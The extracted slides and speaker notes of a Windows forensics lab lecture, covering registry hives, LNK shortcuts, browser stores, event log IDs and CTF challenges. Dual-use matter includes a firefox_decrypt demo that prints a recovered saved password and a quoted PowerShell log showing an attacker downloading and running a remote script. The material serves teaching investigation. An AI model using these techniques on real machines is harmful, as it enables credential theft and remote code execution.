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 to Lab 02. The premise: Windows itself is the primary witness. Students leave able to read a registry hive, a shortcut, a browser store, and an event log. Distribute the working paper BEFORE the session so pre-lab 1.4 is done. Budget about 90 minutes plus live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stops. Contract for the session: Challenge A (the upstream trio) is solved together in the Deep Dive; Challenges B and C are solo and graded. Poll: who has opened regedit before?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Framing slide. Before revealing the four cards, ask: 'name one thing Windows remembers about you without asking'. Collect answers, then map them onto the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five hives. Quick quiz: which hive holds autostart for ALL users? (HKLM - but HKCU Run is where user-scoped persistence lives, and both must be checked). Point at the tree-grammar note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star slide. Open NTUSER.DAT in Registry Explorer live if you can - on a COPY, never the live hive. Walk Mouse, TypedPaths, Run in order; the Malware value is the punchline. Mention value types (REG_SZ / DWORD / BINARY) in passing.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 table - do not read every row. Highlight the big three: Run (persistence), UserAssist (program use, ROT13), MountPoints2 (USB serials). The rest is their cheat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LNK files. The hook: a shortcut OUTLIVES the file it points to - the ghost remains after deletion. The MAC address surprise usually earns a reaction; connect it to LECmd output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Firefox anatomy. The pairing matters: key4.db holds the master key, logins.json the encrypted blobs - firefox_decrypt needs both from the SAME profile. If prepared, run it live against the lab profile and reveal the saved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Chrome plus timestamps. Drill the PRTime conversion once on the board: divide by a million, subtract 11,644,473,600 seconds. Everyone messes this up once - better in class than in the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Event log tooling. Event Viewer for exploring; Get-WinEvent FilterHashtable for speed (server-side filter); wevtutil as the classic. Demo the one-liner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Memorization target: 4624/4625, 4688, 1102, 4104 at minimum. Mini-quiz the class: what does a burst of 4625 mean? What does a single 1102 mean?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4104 story. The irony is the hook: the attacker ENABLED the script-block logging themselves. Read the sequence and let students predict the next action before advancing - the del/re-download loop always surprises.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Toolbox slide - mention where tools come from (Eric Zimmerman's site, DB Browser ships with Kali). Registry Explorer and LECmd are the two they must have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challenges. A: solved together in the Deep Dive. B: a plain-text .reg export - Lab 01 grep skills apply. C: SQL against 310 rows of history. Flags ctf{xxxx}; A keeps upstream format. Hints are staged in working paper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 discipline variant for this lab: every answer must cite the exact key path, file, or Event ID - vague 'I found it in the registry' costs points. Show the model exhibit in Appendix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by asking the class to produce each takeaway before revealing. These four lines are the minimum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Close: clone the repo, preview Lab 03 (documents and steganography - macros and hidden messages in images). Collect working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206240" cy="420624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657600" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1230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FORENSICS LABORATORY  ·  MODULE 02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Windows</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5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Artifacts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 ·  shortcuts  ·  browser stores  ·  event logs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955280" y="4160520"/>
            <a:ext cx="3657600" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4615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38160" y="430682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9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8357616" y="430682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Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8577072" y="430682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0" y="4251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11312" y="4544568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reg query HKCU\...\Run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Malware  REG_SZ  malware.exe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Get-WinEvent -LogName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'Windows PowerShell/Operational'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8978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Lab-2  ·  hands-on session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02 · SESSION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83664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792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artifacts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762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Windows records about everything a user does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64992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3273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Registry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6576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hives, NTUSER.DAT, and where intruders leave traces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LNK shortcuts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51389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 shortcut remembers about the machine that made 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883664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1792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21762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Firefox and Chrome stores: history, logins, decryption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364992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0" y="3273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logs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36576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evtx files, the security Event IDs that matter, PowerShell 4104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846320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&amp; working paper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51389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upstream case + two new challenges + documentation rules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is a witness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constantly records </a:t>
            </a:r>
            <a:pPr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did what, when, and where</a:t>
            </a:r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configuration, program launches, typed paths, plugged-in devices, logons. For an investigator, the operating system itself is the primary witness.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30632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34472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hierarchical database of nearly all configuration and user activity settings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8803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6248" y="30632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&amp; shortcuts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56248" y="34472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LNK files, Recent items, jump lists - the ghosts of opened documents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46634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stores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1248" y="50474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history, downloads, saved logins in SQLite databases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44805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6248" y="46634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logs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56248" y="50474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system's own diary: logons, processes, script executions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five root keys (hives)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47823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key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holds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Forensic interest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HKEY_CURRENT_USER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for the logged-in user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NTUSER.DAT - most user traces live here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HKEY_USERS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loaded user profiles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compare profiles, find the odd one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HKEY_LOCAL_MACHINE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system-wide configuration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services, autostart, devices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HKEY_CLASSES_ROOT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file-type associations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a payload gets executed on open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HKEY_CURRENT_CONFIG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current hardware profile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display and docking details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92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Visualize it as a tree: Computer \ HKEY_CURRENT_USER \ Control Panel \ Mouse — each branch is a key, and keys hold values (name = data).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NTUSER.DAT — the user's fingerprint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Copy-Item C:\Users\w\NTUSER.DAT .   # never the original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the copy in Registry Explorer (Eric Zimmerman)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Panel\Mouse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DoubleClickSpeed = 500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...\Explorer\TypedPaths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url1 = C:\Windows\System32\calc.exe   # most recent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...\CurrentVersion\Run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OneDrive = "...\OneDrive.exe" /background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Malware = C:\Users\w\Desktop\malware.exe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program that starts at EVERY logon = persistence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file captures settings, typed paths, autostart, USB mounts, program use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Explorer (Zimmerman) opens hives other tools cannot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on a copy - the live NTUSER.DAT is locked by Windows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values have types: REG_SZ text, REG_DWORD 32-bit number, REG_BINARY raw bytes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intruders leave traces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566160"/>
                <a:gridCol w="42336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Location (under HKCU)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records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Investigator's question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...\CurrentVersion\Run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programs starting at logon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persists after reboot?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...\Explorer\TypedPaths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paths typed into Explorer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did the user navigate?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...\Explorer\UserAssist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GUI program executions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which tools were run? (ROT13!)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...\Explorer\MountPoints2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mounted volumes and USB devices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which USB stick was plugged in?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...\Explorer\RecentDocs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recently opened documents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which files were touched?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...\Environment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environment variables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subtle persistence spot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SHORTCUTS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LNK files — the ghosts of opened files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3566160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2308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.\LECmd.exe -f passwd.lnk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created : 2021-03-15 08:25:27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modified: 2021-03-15 10:36:47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path     : C:\Users\Challenger\Desktop\passwd.txt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 Dir    : C:\Users\Challenger\Desktop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 ID     : desktop-rsrl4hd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 Address    : 08-00-27-2a-dc-e0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shortcut remembers the machine that created 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 .lnk reveals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path of the target file, even if the file is gone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created / modified / accessed timestamps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hostname and MAC address of the creating machine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 under Recent, Desktop, Start Menu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BROWSERS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Firefox — the profile folder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Firefox remembers lives in one profile folder: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69087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Holds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to read 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places.sqlite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history, bookmarks, downloads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DB Browser for SQLite / sqlite3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key4.db + logins.json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saved logins (encrypted)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firefox_decrypt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cookies.sqlite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session cookies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DB Browser for SQLite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formhistory.sqlite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search box and form entries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DB Browser for SQLite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14800"/>
            <a:ext cx="11091672" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4500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426110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426110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9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170432" y="426110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10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="420624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4672" y="4498848"/>
            <a:ext cx="10588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python firefox_decrypt.py .\s6upyldt.default-release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Website:   https://www.reddit.com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Username: 'hackerman'      Password: 'sup3rs3cur3p4ssw0rd'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key4.db holds the master key; logins.json holds the encrypted blobs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BROWSERS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Chrome — and reading the timeline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6908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Store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Chrome location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Forensic use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History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 Data\Default\History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visits and downloads (SQLite)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 Data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 Data\Default\Login Data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saved credentials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State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 Data\Local State (JSON)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holds the encryption key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Timestamps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Webkit/Chrome epoch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microseconds since 1601-01-01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06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thinking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4645152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history is not just a list - it is a chronological narrative of intent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Firefox stores times in PRTime: microseconds since 1601 (add 11644473600 seconds to get Unix time)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correlate history with event logs and registry timestamps to build one incident timeline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LOGS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system's diary (.evtx)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ls C:\Windows\System32\winevt\Logs | select -First 6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Security.evtx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Microsoft-Windows-PowerShell%4Operational.evtx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Microsoft-Windows-Windows Defender%4Operational.evtx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Get-WinEvent -LogName 'Windows PowerShell/Operational'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-MaxEvents 20 | Format-List TimeCreated, Id, Message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wevtutil qe Security /q:"*[System[(EventID=4624)]]" /c:5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every event has an ID - the ID is the vocabulary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strategy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Viewer for exploring; wevtutil / Get-WinEvent for volume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Event ID first, then by time window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channels worth knowing: Security, PowerShell, Defender, Firewall, Sysmon (if present)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gaps and clears (1102) are findings too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LOGS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IDs worth memorizing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971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Event ID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Meaning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4624 / 4625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logon SUCCESS / logon FAILURE (brute force pattern)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4634 / 4647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logoff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4648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logon with explicit credentials (lateral movement hint)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4688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new process was created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4720 / 4726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account created / deleted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audit log was CLEARED - classic anti-forensics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1116 / 1117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Defender detected malware / took action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4104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PowerShell script block - the script text itself is logged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4104 — the attacker's transcript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the lab's PowerShell Operational log (Event ID 4104):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New-Item HKLM:\...\ScriptBlockLogging -Force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Set-ItemProperty ... EnableScriptBlockLogging -Value 1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Invoke-WebRequest -Uri https://[...]/file.ps1 -OutFile file.ps1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.\file.ps1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Invoke-WebRequest -Uri https://[...]/file.ps1 -OutFile file.ps1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.\file.ps1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attacker ENABLED logging, downloaded, deleted, re-downloaded,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executed - the full story survived in the log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Windows artifacts toolbox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511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Registry Explorer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 hive files, browse keys and values, see transaction logs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LECmd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parse LNK shortcuts into readable metadata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 Browser for SQLite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explore places.sqlite and every browser store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firefox_decrypt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decrypt saved logins using key4.db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 Viewer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explore evtx logs interactively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wevtutil / Get-WinEvent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query evtx from the command line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challenges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upstream case files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NTUSER.DAT + Firefox + evtx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3355848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evidence sets, one story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registry, browser, script log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solved together in the Deep Dive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original lab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1396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7428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B — new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7428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suspect_ntuser.reg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67428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files/suspect_ntuser.reg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67428" y="3355848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exported hive of a suspect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Run value looks legitimate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 what it really runs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67428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 hunt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4152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0184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C — new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places.sqlite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30184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files/places.sqlite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30184" y="3355848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310 rows of browsing history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suspicious evening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+ URL decoding for the flag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30184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 hunt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 format:  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="140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ctf{xxxx}</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14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(Challenge A keeps the upstream flag format)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paper &amp; evidence rules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Pre-lab first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1.4 of the working paper, before the session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57860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on copies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8986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NTUSER.DAT, the profile, the evtx - never open originals in place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41985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your evidence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73989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 and outputs get B-01, B-02, B-03 in the evidence log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26110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what you touch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58114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integrity form before and after analysis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1023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 key paths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54223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must name the exact key path, file, or Event ID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60920" y="1920240"/>
            <a:ext cx="4251960" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3600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43800" y="206654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26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7763256" y="206654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7" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7982712" y="206654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201168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16952" y="23042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evidence log entry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[B-07] 2026-09-30 10:12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 query "HKCU\...\Run"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Malware  REG_SZ  malware.exe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persistence confirmed at logon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60920" y="4480560"/>
            <a:ext cx="4251960" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="134B56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35240" y="46451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evidence, no answer.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635240" y="510235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claim must trace back to a numbered exhibit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1673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135331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Registry is a biography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600200" y="17556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settings, autostart, typed paths, USB mounts, program use - all in NTUSER.DAT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52374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25603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Shortcuts outlive files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00200" y="296265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LNK remembers paths, times, hostname, even the MAC address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73075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00200" y="376732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Browsers keep receipts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00200" y="416966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 in SQLite, logins encrypted but recoverable, timestamps in PRTime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00200" y="497433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logs are testimony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00200" y="53766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the IDs: 4624/4625, 4688, 1102, and PowerShell 4104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480560"/>
            <a:ext cx="4023360" cy="402336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Grab the artifacts and start reading.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7498080" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4286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343814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343814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343814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33832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3675888"/>
            <a:ext cx="6995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git clone https://github.com/stprasst/digital-forensic-lab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cd digital-forensic-lab/Lab\ 02/files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ls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Firefox.zip  NTUSER.DAT  suspect_ntuser.reg  places.sqlite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 </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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  ·  Digital Forensics Laboratory  ·  Lab-2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02 - Common Windows Artifacts</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Stefanus Eko Prasetyo</dc:creator>
  <cp:lastModifiedBy>Stefanus Eko Prasetyo</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-28T11:33:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-28T11:33:04Z</dcterms:modified>
</cp:coreProperties>
</file>